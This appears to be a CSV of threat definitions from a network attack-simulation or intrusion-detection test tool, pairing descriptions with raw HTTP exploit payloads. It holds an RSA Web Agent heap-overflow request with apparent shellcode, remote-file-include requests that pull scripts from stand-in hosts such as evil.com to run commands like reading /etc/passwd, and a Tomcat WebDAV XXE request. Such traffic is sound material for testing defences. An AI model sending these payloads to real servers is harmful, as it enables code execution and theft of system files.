XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿rsa_webagent.xml,RSA WebAgent Heap Overflow,This threat causes a heap overflow in the RSA SecurID Web Agent.  This leads to potential remote code execution with the privileges of the webserver.  Webservers typically listen on port 80.,HTTP,TCP,"GET /WebID/IISWebAgentIF.dll?Redirect?url=aaHLcrYAlpyXAlAVQIpfTuoAmNugVtASjqApfAycEAmsShxigNRCmAvSAAYpYAVBEuWtkAPJkmbABSXAhBvAWAcvAmAnBYBAVOJANcAHLAUpLAkWvAEitwBAApLAbNlwUtAAbbAreGIlWeFASvXIFdVusABARAXcdAuAwjpxTQAAYENtRWwLRneAlgIFSrFOcAepkhAdaoreAlpueNAvUWFDYdAVOANGEAbAqpGAdbAANAAhWMjjAOFogpxLCAMmCkQSTnmIJSoEJgIEEAWpFkYlAToAAvJxAjAKejNePrpsSlBICAPOTkAgHJACUUnBQAVLmAAQLHsAAUFoohGxBVFVJtNbAAwAAcEegVwSXtAobqtXSAQlrAvjEstAfLkBmAJOoeBFBKfkDOAqgmEYAAllNKAqEBgAmPFAAApbvqrCtkcysAAVqYAqKyVCCoOdsAipMGhutdjHfAACuuaYBSnAgYRVSrtPVFiRdwWAgVRAAwXTMOAyAPhinAAALRfkcANMjFrflbfEwsAAlOoDXALdPAAAVRJurkHQtrridjyIAaxuHVSAApIqAAAAAjDSVAJWlAsdWWghaAHAVJAACOpImjsuAeAAhDABFYAqtFcYpRYBjAABAGyptFMbIBcxLleFEvdaPVIleAUADAExMObFefAMDjAhRAgXAPAMmYAAltEXAMLbbOiyBACtAMxYAQpgMdSAtVJARawlAcwgTAgyLQjnMgHAXCeoJBASAAdYbJxAqaiwXakAqvnAYJTklMmOeRQiIcAbQDHDbxXQHqcCjMFeaojAEfbAAeAxAuwUKhuOgNBwFWAALouAlJbXJAYXAAaAwofAXiAwegAkEKmAbJVWhYAWWAtWCNwAyAFAwYAoilQXTAGSgxiAjgCAjxAeAPntKbGHbpMqAbslANnLCTvBARMvSWwPlpDRreBkXtRVAmAAAEfLbOAAAAAFBAAKAARBjFSBASAhAKkVAJGVAYNl||EB 06 ||yAr||93 AB ||q||90 FC 9B 90 ||I||97 D6 96 92 D6 ||G||96 ||A||9F ||G||9F 96 9F ||7K||93 96 92 98 ||B||D6 F8 9F 91 99 F8 F9 99 FD 91 ||KOO||F9 98 ||GG||F9 F8 90 D6 ||I||91 F5 97 97 9F FC 92 97 FD ||G||F5 91 ||G||D6 ||A||F9 ||OG||93 ||AAI||9B ||N||90 ||N||98 ||7A||9F ||H||9F ||C||98 FC 9B 90 F9 ||K||F8 FC FC D6 93 96 92 90 F8 ||CN||90 ||I||99 F5 99 ||NF||92 ||OBB||92 FC 96 ||N7||FD ||B||90 9F ||HFF||F9 ||O||92 FC 90 ||NN||F5 F8 99 ||H||92 90 ||O||D6 98 ||7JA7||97 ||OJ||9B ||AOKJHN||9B ||NKC||97 97 ||N||9B ||FF||D6 D6 D6 ||N||93 98 91 ||K||9F ||7||F8 ||H||FC 90 96 90 F8 ||CB||98 ||J||FC ||BKG||90 FC ||FJ||90 FD 9B FD D6 9F 90 99 ||A||99 F8 F8 ||K||92 F5 ||NGB||92 92 ||G||9F F5 ||FGGH||F8 ||OK||FC F5 ||JIJ||F8 99 9B ||7||96 ||F||FC FD 92 ||CGK||9F ||F||96 ||JB||FD F5 FC ||7||F8 ||FBH||9F ||AH7||93 9B ||O||FC 90 ||OB7||99 90 ||ABKI||91 ||C||99 90 ||7||F5 D6 ||77||D6 F5 ||KA||FC ||H||F8 9F 93 F9 ||C||F9 F9 9F ||IGIJ||F9 98 ||HKKK||91 ||G||9F ||CF||97 FD 91 ||I||F9 FD 98 9F FD 96 ||C||93 ||H||93 99 ||B||F5 ||B||D6 97 9B ||7||F5 96 ||C||9F 9B F8 ||H||91 F8 ||7||FC F8 ||A||F8 ||NI||D6 D6 9B 99 96 99 93 ||BCK7IO||9B ||I||97 F5 9F 90 91 99 ||I||99 F8 ||OJF||98 D6 F5 9B 99 ||I||92 ||OJO||98 D6 ||G||F9 ||N||F5 ||KFG||D6 93 90 ||OH||91 FD ||7||91 FD 99 ||H||F8 ||BOC||9B F5 D6 93 99 ||B||F8 FC ||7||D6 98 9B FC ||F||FD F5 ||O||F8 ||I||9B 93 ||J7O||9F 9F 9F ||JBHNG||9B 9F FD ||HJ||F9 99 ||NGB||92 99 ||I||F5 ||G||91 F5 97 ||H||99 90 92 99 ||JFHOHBK||FC 97 ||I||90 FC ||F||F8 9F 90 D6 F8 ||K||9B F9 9F ||7||F5 93 98 ||F||99 ||J||FD 9F F5 ||I||96 98 97 98 ||J||FC 9F ||C||F9 92 ||G||92 FC ||K||99 91 ||7KCFO||98 96 96 96 99 96 96 ||C||F9 90 ||J||97 ||B||FC ||F7I||F5 98 ||I||99 ||7C||F5 FD 99 90 ||NO||96 ||BO||9B F8 92 F8 90 ||K||9B ||J||92 93 99 F5 F5 90 FC 96 96 98 ||JC||91 D6 ||IK||F5 ||C||FC 92 F8 FD ||B||9F 90 92 ||N||93 9B ||IF||FD ||7||92 ||7||90 ||B||91 91 96 F5 ||JKH||F9 91 ||N||98 ||7||FD 99 ||FG7F||98 ||CBIBG||91 ||OKH||F9 99 ||O||98 ||NBK||F5 F5 ||O||93 97 FD 91 ||JAK||F9 ||N||96 ||A||98 98 ||CG||D6 ||I||D6 F9 ||7||F8 ||FCI||96 97 ||G||F9 96 F8 ||NGJ||96 96 ||F||F5 92 F8 98 F9 ||N||96 90 ||C||90 99 91 ||JjQY||D9 EE D9 ||t$||F4 ||[||81 ||s||13 91 1E 9D 85 83 EB FC E2 F4 10 DA C9 ||wn||E1 ||a||EF ||zSu||7C ||n||E1 ||b||E5 1A ||r||B9 A1 1A ||[||A1 0E ED 1B E5 84 ||~||95 D2 9D 1A ||A||BD 84 ||zW||16 B1 1A 1F ||s||B4 ||Q||87 ||1||01 ||Qj||9A ||D[||13 9C ||Gz||EA A6 D1 B5 ||6||E8 ||`||1A ||A||B9 84 ||zx||16 89 DA 95 C2 99 90 F5 9E A9 1A 97 F1 A1 8D ||^||B4 ||Jz||16 C6 A1 95 DD 89 1A ||n||81 ||(||1A ||^||95 DB F9 90 D3 8B ||}NbS||F7 ||M||FB ED A2 ||,||F5 F2 E2 ||,||C2 D1 ||n||CE F5 ||N||7C E2 A6 D5 ||n||C8 C2 0C ||tx||1C ||h||99 1C C8 EF 93 E1 ||M||ED ||H||17 ||h(||C6 E1 ||K||D6 C2 ||M||CE D6 D2 ||M||DE D6 ||n||CE FB ED 80 ||B||FB D6 18 FF 08 ED ||5||04 ED ||B||C6 E1 ||K||EF 81 ||O||C8 ||zAv9(||BF F7 CA ||zGM||C8 ||zAvx||CC 17 ||W||CA ||zGN||C9 D1 C4 E1 ||M||16 F9 F9 E4 ||C||E8 ||IbS||C4 E1 ||M||E3 FB ||z||FB ED F2 ||s||14 ||`||FB ||N||C4 AC ||]||97 ||z||EF D5 97 ||||B4 ||Q||ED ||7{||D3 ||3c||C7 BD 8D 10 FF A9 B5 ||6.||F9 ||lc6||87 E1 E8 C1 ||n||C8 C6 D2 C3 ||O||CC D4 FB 1F CC D4 C4 ||ObU||F9 B3 ||D||80 ||_MbS||FB E1 ||b||B2 ||n||CE 16 D2 ||m||9D ||Y||E1 ||n||C8 CF ||zAvm||0F 95 ||A||CE ||zG||E1 ||M||85 ||CpyAfPFOetDVpAXEfQAeYDAAAuAgIqfAcUEnXLQraAWQTnqDAAbeAAFadwDWVCToAyAcOSlcHNAHbRAAQJSAiuOUxALAAJFrjOAANTnvAurgmwApAAFoAgJOAXrpAAAQFoJNeMXagVRtbUwsWMMHAjHrqEHePVAArGAeHGAsBNAAqbqDiAWltAtiTVHPKkRRAQnVAxAMsCAAEuAACAYagAANCFgyAkAoAAbcYIpAAMArFAClEayYRiSAAMAXWAASfAJAIAAJAldqOOFAYxAAtQbmASAllssFVANAARAxWYEvUIaAOAddCMAlMuqvsxVAgXAAWRnAtdXAAktAOrWnbAQyOnCAAMLYXwiPUPAAOAAAghNAwAOvosAAAAsDGAoRyOyAAUKhAAAvDAPRAANDWcBiEIYAeXARyvAKAfPiyUijQqQYMAMLAApASbufWKXmWcILAGkMQfoUCAAAGceeGMApDAYhADQAlkAuwQLgmAjrArAYbSaOHoOQJALAvRbbdAqRuAEwJwOveRAAXAPcqCMMAIviCQPsglasyAAPTAAAAQwAMnAANXAAaeVDyfGjOQNkoFAARhloAtOEAkKAQQbHrpoAQAkVYiyMbYhqCASApospKbrJCnWAjOMpKeIrNBiAsYtQATAMcBglAPXKDLABdAvwHdPlSbAgecUxxrxGLFARwMgseCxVYAIkAtOIaYAmURcAFmWcaIAJXLgIkOQRMxAYMmlpMAeQAULJMppIgdAjEjSWyXGMDSHhTPwqfJEnIAUjhPeAKBfAAlGdHKeTIpABQArEwKAsTNjyfhIxFGFvvAPhvDNIaAEUAjpAKbANbtgntAAAHqABCSFAbrIIAjNAjyAFdnObYAKayWHrYAVeuXAmAsUCjXbTSAmwAYXcAHUbhAAOESaKMjqfvJYNAAYGjjoSAAmHyncnhcUAAyAAlIKQGKaAlEGIwfjABXAAaUaMWnDCuAdQsQdPAjNfrfpvstfaGovrADurImfAYNWTmaAMjeDQoAdlMYVHlOAPSwlAdeiRpuGUgOtwAAwtLReAlYidAgmsoocVGnEOEDAXypABAdaROAAAiVlNPAKyledWpwXqGAJLAAAdsvHEwqmFYeABwOBAKWcAPAyQkwafXVAbBQmqtjAYAAHqjAtQAroTFYIqeAAeTRAuAxBxFrXoTAdAsAMQfUAAEyDByyQrUAArkPKnPAHiIMDUQPEIFAFEUBmpAsAABAXiAENerCFAqYLxcrwpACSAkJAACFAGXLVMEJAAlAApdAAPOwpjgYqOwdyhBAdHPYrRRMtPAeAAAwKxBSxtApUyQchkaAvlCrSgMlnapBurLHAGDVxuiyEmTOAdAbJsJAUpLAoVApaAAnXSunQPAnAYQOtdoUtwCmBcNiJqAftyHnTfragrDAymAWLAgDpEuesOLnAAUysAxOWxtQoAeaLxAIFPABoAAoAkgABBAbIDBAAxfPAMVwpnWkAxWAxQKURsPAnNOEAXkMYsSKAtfvbqeEAHDVrARTAycAxjIApSCARARGAFAhNAnpxMAfAlOAxAIXPpkAxhdSveADdAQAcOGvKACAsADegXaAAAWgAdfKXEAAdsMcuJAAXAayAfKpAANNcqJfAAKfVAMNANxAaOBcLhjQeQAJeAOuAQuVyCACrQyAEqAARkcYAAHAAApHUAXNAToMTAbVWsTWGAHbjcEAAFIMYXEVhSpASSgvonBbRBNIAxRAAmASTswiwNCwMPQmxYQJUCHUjbbAyatfJTdhOQDAUvAedcUAAdAADFruAvGNIYvDwChEFACAcoALGAuXayOAoAGAchsILAbAnttAUbEAyCYAqMvABArEdiSqAOsQKsAWEAWkdVkBAMqkWDkwuFvevFxcAnOdfOUBNOAAfMAAUvEgVAuAEAVpqDAjeAUqLrAMAAiIAQAjrAAAAWfIxLPWBWqhAQAAvXGdhUAtASJCDhTAAAAAoTNGsGXpXAIGlAAPpbibglAABPhiMhTABjqiKEPitifKfNhcmMAGNMtAkeVflnsdhwVKAqEABTcAoIrrAHVJadNBanAAAqWsljRkEAGcMehuCCTcJfMOEpAbQAYLxAIAuOAgngcAAbNVEEAtwEIQhAKpAMAAaTXVJAcOuoQAPFQAvHEuAhaqAmnaWADAAbbKvAigEAEvoAnJHAALMgLJMMrADTAIKAQBoQAakAAatIiMAjkQfjjXAUeHASAKnYmYDjbQAAAKXQHAAoAjyOAgwaAAAAjAWAdujAPdweKLhAAGVeAoWhArbvwVLBfSawJdAmIyRxqbgAjbADlRyRRAmtSAAXHaCYXbSxRYIxOhAbkAtOkmAAiGNRlNhgTAqfMAldAAoMAxqJvAfaPAuAUDOsAxOmvWmTAfycVoBAvTvoBWAHqfCmewAeeREYTfQhAWQXSWBKuAAeCCisGYoMHEpgeeLyVOAKAkiAOBqUiADFATAPGJAAQpMXaApieAASAuAQArftAAAhRfDbyRSAwSSEUmMTCWvftnpwoylKSIRsGPAmhAHUGmDsBurryASAlLAAoAaGADRIILAAHhAtAumqvDAPAPHsMIRAAMVAvnHFHlhdAULLAAUtAAOASVGfVAAgeSyuAjpiAqEuOwCOHqfrAAaWYLABInTxAAecORAhlaYADAASHEhAlAbddjMguYAOkFAAmcoAyOpgeAaAAemlcOUAAMRAViRsQXAmATVAAVJAhFfiAmAXEqHWAmjCsewKykBbsVxBArIASflAAwGPJgAVAJeAALfrfWPARAAaAySArOAANipAQDqPUAIAdUakvcyYALgLNAXlKNamItbYscJEcJVTXAfVHAncdCllceSAlsAABnpqavMYWusfnWGXMNakpNAfAagUSBAnRrtaTAGBoIwAAArAPurmSdNuVAAsKOdskQFnuBAeTcQRcCXobCQArFJaJABDDjCPKBCcAvuRUykDAtPMAQxHjIihLALhPmidAViAUxeAmARvivxtRyvEwTiTAgAPAKAqePFfTaUcAtohdVPXUqfmEjxAjhtjUAMfbhAAAXmuuUgAqBoYAYkcAAqgYYKDAEVDMUPCAjxMruJAehLiAaXAlAvvALaEOClnExQArRYJXDBaAuALXNAbcsCioyAxcAcNLVlxGmnAxiMdvXfPfAAAXncGAFjEJrqVWAyoKAFksBOLhBAOABFwapVkNRqocOaEDRcsYeAKArreyAnIhDuAsTAAOrkNAAtIDEAiAUtSOadYhAQFAAfXbLAIfgsuEAAHVMBPIFJPHiXtCWCMhMSwxvOCgAAAhsbHuAAdXAAqbAsAjyAADkqJAXeGoyfRAxqHtfRACEkadAJvPKqCQxSPAEAAMHAAAmHAAiAAvbAAIjcaccnPHDoSvABAAhJDTobKyoKANwLTnQqHYtsWhAAUmibObqACTKHBKwAitLbxsABGcAcAIOjvixAAEEKPLiAAwAGilkAEeNPjeCVAYmHwtGEygHAAnvmjoKAMUUdHARAlAiAAxEiAluibCtwUuAKAqAgwARUkcGxqyxAUdEtBAtAaAnmADwkmAwDAKQAAUkhAAqdApAAUjAAUaQfVuGWAqvAaCAWFBqQoalowwCmIhbQAliVvIAApftAgAlYARATAqesCWqIdLAYASOAXAAAAtWAlAitAeoORAjxNeAfQAIIiHAWGEuLAAAjayOlAcCqblchSMVMnOQUAwAYTdnJgUYtyYAobAhpTKAAWObMGADEdArIYAhAbeJAwAqExAAowBRuxASvAvNHUEpAvNotivABLUwIiyACAAeEqXWGAyRRtlhUrPXxMJBlUAxAdCAfAAAwxvAkApoCAlgOAhqKPWEhByLeAxmrAALAyATAJSjAQwmAFohKfrvhmqfGIVUwkAeAJvPAjAfNsfegUAvLJGBchvGGTJkYAoRnAASuhAVkTpIVMBADaAvAxWCqANhaFVAEARcxsACwERDvAVAVXjdtAVbYrflIYowwAgjKAAERAHVAGtPFAxmQApPgAXQQJjAKmwJieCTQGyQtqtoXFAAAcgAIdJdSKTmAAaAAnkxTARqiYKieAySfAbPJGvTvygmKAAiOAvxaWeEoqeNxQYAAUAcAdeWAAgxfMLyPCWAxAaQIkhHQaWsyAAQAKuLAWRwaUAFXbOUBErAAySAsrtADFqIAAAhMKaBnKAglYxPBgBiAsArpeSVLpAtPLbAidAAAMlFcAjULlgfIqksAQNrHyJWwSsJmFRaAnYlIHlYbUAUAMQfAATTkomrhYXnmoXsAHJAAnLLpOsAXghifYoARACANAXArgwkArqQlsSOoWaARAdPYlrhSqIdtoYtEApvcAPUAWRArGAIsdLVAAyTYBccGRHAgBAArBlwCxAssVQUgmqcTAUPVeDAoKwbudlWuexsRPkPAXvAACAAHnAAJAAAermdMARvnduDneAAuDcnQefJwOAqahWFSUnEjgAfLkXOjfUhOxVwxAsRAdwseNtCdnFqyVAAAAmqHAjjtAROfCPgPANIAPboeAgABAfqBqDqMAhbAXAsAgAqLBbAOtVVkxbTdUAJpFHAJTPIinAVsNeNfAADAWIbvcXmAeEFGmXyhLfdySAnVJAsAAAsCAXJJtAljAnSAXEgIfoFYuFbAuAdAfYqhiUAdAlYDWYAAquAOeeANRTUAioWpPvDlAjAJkkAcBnRAASoGAAsNhkAAvAAAKWpwXdhOqeGCnHIAIASyhAQYAiggHGtusrHDSKbLIAdNtTkgmpiEmDemxJBcnuIotMCLXojbgAGGkMRARxClBFIyVqAuuIEHOAnnAVVtFSAwqMXeKmVckCoAqNIcIKFHoRhAdqQQJAgJTyqGjcgyhjbAgONXIPAMHeIoALAnlOARjXrCYvcAdvAXwuGmunKNAWAgllAqARxmuAxAFeWAAHIJEnVENbAvCspkVkoAFnxhFMIAyvXADcvAcTAoRSASHAAUnUIAdyAuwBAQNgIJcBTxAAoeAyiANMhnArXpLEmBaVAtanfAvVWAcYAAvRxABXLAfjAKTpAArADUkAXnAYwALkOdGierAAfQaYAdHAoAnAiRuBXmledLuAvAgHYuATBQkELLxiHoAcDEOMANggpisBQlAFsNegDNAGBuLAsIkAHxOAAAJAEHnMowjnoAAAnIVAVsDuvDkEBbFoXAdrWKtrgBMXbAqADpGAwkgGxjAFqMsyjqAAgtCAiAMAcESqWLOmltygHhXrAiohBAROqAGCPVGrtvnYjoaxXvMXARPvqeTRXQAutFLVxHAqgAAYxuATtFfvBBTXuVAguaBoVxFSKBUecAALBraOwAcOcADHWAABAAUoAgWQWAHleQGTATPomawAPptBINcAWDTNmRRuAxJfiHsYdALDfNOBHAFkJXDMpOIpCAFbSAYTKApAAAsAIOGxAAIiQNKoJTknOSAMShAMbEHRPuGXjAAyAHmqFDccAnsKYRXAbwISOBKRNWimQSnrBcARSLmVsgjJlASnoMNatsGMAHABtVjTJsrAnYAClAAfehAAYQAPBUPTQaRyAUbPIIKAQAIkAoAqQMAMcJATNenrAABEAiANAJtytNfOAApAspWUnOogjvKuMCAyGxAtALfARVCOLaGYdDEYynYaEBiAAuAjXUAqhiOAAHEEClMQOAchDViADXwAiaAAAERJAeAsApAqJqAAQDBdBjdJTAeCCGvuyMIGATAtTJKKbrPKAhUBiiJAQAnAAAfHGAwgkoTAAjrXVAAyfqcOAlRXfuMbArCMhXqHkAAemwIAIorAyVnmIsAmgHSsFBfvAsjnteuIpQAmQhQAYttAWTQYutCeVtJdcFdAEAUvAAJNsJAlcAAAAhvAtnDAAANCUEPAQxwJRymloMIrKDSXpvaAAApFPPMAAARbobTOTkfWtASTARnmxolAuOtxDdPOQQeVeLkHAIUsBALnAcAlHTtAwcHLAVxvAAoAAwqSGJNyAdmAtkjoAGvqAAAAAAaevAATAAFWbSAFiAcoAAaWQiAtfOAtlnARnAAxeCcDArvAiymLOAXbqAeAAJAnAAAtOrdyPuSAODhXAyjWFCwLjniHvmBqbymgFjcEbTYkTAPYpcSqGedAKAEdAgdgjleyGAXentJCTmxAACriQrqioyAqYAtAGurDyeRCbEuTAhmDdbh HTTP/1.0||0D 0A 0D 0A||"
rsa_webagent.xml,RSA WebAgent Heap Overflow,This threat causes a heap overflow in the RSA SecurID Web Agent.  This leads to potential remote code execution with the privileges of the webserver.  Webservers typically listen on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿savewebportal_rfi.xml,SaveWeb Portal SITE_Path Parameter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. SaveWeb Portal is a web application that typically listens on port 80,HTTP,TCP,GET /menu_dx.php?SITE_Path=http||3A ||//evil.com/cmd.txt?&cmd=cat+/etc/passwd HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Scooter/3.3||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
savewebportal_rfi.xml,SaveWeb Portal SITE_Path Parameter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. SaveWeb Portal is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿tomcat_webdav_file_disclosure.xml,Apache Tomcat (webdav) Remote File Disclosure Vulnerability,"This threat leverages an absolute path traversal vulnerability in Apache Tomcat which allows reading of arbitrary files via a WebDAV write request with a SYSTEM tag, thus resulting in information disclosure. Apache Tomcat is a web server and typically listens on port 80.",HTTP,TCP,LOCK /webdav HTTP/1.1||0D 0A ||Host||3A || victim.com||0D 0D 0A ||Authorization||3A || Basic dG9tY2F0OnRvbWNhdA==||0D 0A ||Content-Type||3A || text/xml||0D 0A ||Content-Length||3A || 291||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 ||?>||0D 0A ||<!DOCTYPE REMOTE [||0D 0A ||<!ENTITY RemoteX SYSTEM ||22 ||/etc/passwd||22 ||>||0D 0A ||]>||0D 0A ||<D||3A ||lockinfo xmlns||3A ||D='DAV||3A ||'>||0D 0A ||<D||3A ||lockscope><D||3A ||exclusive/></D||3A ||lockscope>||0D 0A ||<D||3A ||locktype><D||3A ||write/></D||3A ||locktype>||0D 0A ||<D||3A ||owner>||0D 0A ||<D||3A ||href>||0D 0A ||<REMOTE>||0D 0A ||<RemoteX>&RemoteX||3B ||</RemoteX>||0D 0A ||</REMOTE>||0D 0A ||</D||3A ||href>||0D 0A ||</D||3A ||owner>||0D 0A ||</D||3A ||lockinfo>||0D 0A||
tomcat_webdav_file_disclosure.xml,Apache Tomcat (webdav) Remote File Disclosure Vulnerability,"This threat leverages an absolute path traversal vulnerability in Apache Tomcat which allows reading of arbitrary files via a WebDAV write request with a SYSTEM tag, thus resulting in information disclosure. Apache Tomcat is a web server and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿web-inf.xml,WEB-INF Directory Contents Listing,"This threat attempts to list the files contained in the WEB-INF directory, which should not normally be accessible with a J2EE web server.  J2EE webservers typically listen on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿web-news_rfi.xml,Web-News Template.PHP Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Web-News is a web application that typically listens on port 80.,HTTP,TCP,GET /webnews/template.php?content_page=http||3A ||//shell.org/shell.php? HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
web-news_rfi.xml,Web-News Template.PHP Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Web-News is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿web-provence_rfi.xml,Web-Provence SL_Site Spaw_control.class.PHP Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. Web-Provence is a web application that typically listens on port 80.,HTTP,TCP,GET /admin/editeur/spaw_control.class.php?spaw_root=http||3A ||//evil.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.1)Firefox/1.5.0.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
